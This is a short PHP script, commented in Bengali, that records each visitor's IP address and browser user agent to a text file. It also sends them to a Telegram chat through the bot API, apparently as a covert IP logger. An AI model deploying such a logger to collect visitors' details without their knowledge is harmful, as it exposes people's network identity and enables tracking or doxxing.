<?php
// Render Environment Variable থেকে টোকেন ও চ্যাট আইডি নিন
$botToken = getenv('BOT_TOKEN');
$chatId   = getenv('CHAT_ID');

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}
$browser = $_SERVER['HTTP_USER_AGENT'];

// সাময়িকভাবে ফাইলে সেভ
$fp = fopen('/app/ip.txt', 'a');
fwrite($fp, "IP: $ipaddress\nUser-Agent: $browser\n\n");
fclose($fp);

// Telegram-এ পাঠান
$msg = "🔔 নতুন ভিজিটর!\n🌐 IP: $ipaddress\n💻 Device: $browser";
@file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
?>
